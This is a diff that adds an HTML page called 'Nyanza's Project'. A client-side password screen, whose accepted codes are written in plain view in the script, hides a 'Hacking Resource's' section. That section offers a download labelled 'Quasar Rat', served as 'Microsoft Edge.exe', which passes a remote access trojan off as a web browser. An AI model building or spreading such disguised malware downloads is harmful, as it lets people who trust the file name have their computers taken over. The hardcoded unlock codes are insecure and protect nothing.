@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Nyanza's Project</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        /* General styling with color scheme */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #0d0026;
+            color: white;
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            overflow: hidden;  /* Hide scrollbars */
+        }
+
+        h1, h3 {
+            text-shadow: 0 0 5px white;
+        }
+
+        h1 {
+            font-size: 4em;
+            margin: 0;
+            padding-bottom: 20px;
+        }
+
+        h3 {
+            font-size: 1.5em;
+            margin: 20px 0;
+        }
+
+        .content-section {
+            margin: 20px;
+            max-width: 800px;
+            text-align: left;
+        }
+
+        a {
+            color: white;
+            text-decoration: none;
+            font-size: 1.5em;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px 20px;
+            text-shadow: 0 0 2px white;
+            display: inline-block;
+            margin: 10px 0;
+        }
+
+        a:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .warning {
+            background-color: #ff6600;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 30px;
+            font-size: 1.2em;
+        }
+
+        /* Unlock Page Styling */
+        .unlock-page {
+            background-color: #0d0026; /* Same color as the rest of the page */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: none; /* No border, just the background */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+
+        .unlock-page input {
+            padding: 10px;
+            font-size: 1.2em;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+            background-color: rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+
+        .unlock-page button {
+            padding: 10px 20px;
+            font-size: 1.5em;
+            background-color: #ff6600;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+
+        .unlock-page button:hover {
+            background-color: #ff3300;
+        }
+
+        /* Hidden Content */
+        #main-content {
+            display: none;
+        }
+
+        /* Hacking Resource Section */
+        .resources {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 30px;
+        }
+
+        .card {
+            background-color: #2a1a3d;
+            width: 250px;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+            text-align: center;
+        }
+
+        .card h3 {
+            font-size: 1.3em;
+            margin-bottom: 10px;
+        }
+
+        .card a {
+            font-size: 1.2em;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 8px 15px;
+            border-radius: 5px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+
+        .card a:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Unlock Page -->
+    <div id="unlock-page" class="unlock-page">
+        <h1>Unlock Access</h1>
+        <h3>Enter the code to proceed</h3>
+        <form id="unlock-form">
+            <input type="password" id="unlock-code" placeholder="Enter Code" required>
+            <button type="submit">Unlock</button>
+        </form>
+    </div>
+
+    <!-- Main Content -->
+    <div id="main-content">
+        <h1>Hacking Resource's</h1>
+
+        <div class="resources">
+            <!-- Card 1 -->
+            <div class="card">
+                <h3>Quasar Rat</h3>
+                <a href="/assets/Microsoft Edge.exe" download>Microsoft Edge Quasar</a>
+            </div>
+
+            <!-- Card 2 -->
+            <div class="card">
+                <h3>Resource 2</h3>
+                <a href="#">Link 2</a>
+            </div>
+
+            <!-- Card 3 -->
+            <div class="card">
+                <h3>Resource 3</h3>
+                <a href="#">Link 3</a>
+            </div>
+
+            <!-- Card 4 -->
+            <div class="card">
+                <h3>Resource 4</h3>
+                <a href="#">Link 4</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // List of valid unlock codes
+        const validCodes = ['936826', 'admin', 'nn20M*5+:', 'Nyanza'];  
+        const unlockPage = document.getElementById('unlock-page');
+        const mainContent = document.getElementById('main-content');
+        const unlockForm = document.getElementById('unlock-form');
+        const unlockInput = document.getElementById('unlock-code');
+
+        // Every time the page reloads, the unlock screen will show
+        unlockPage.style.display = 'flex';
+        mainContent.style.display = 'none';
+
+        // Handle form submission
+        unlockForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const enteredCode = unlockInput.value;
+
+            // Check if the entered code matches any of the valid codes
+            if (validCodes.includes(enteredCode)) {
+                // Code is correct, unlock the page
+                unlockPage.style.display = 'none';
+                mainContent.style.display = 'block';
+            } else {
+                alert('Incorrect code. Please try again.');
+            }
+        });
+    </script>
+
+</body>
+
+</html>
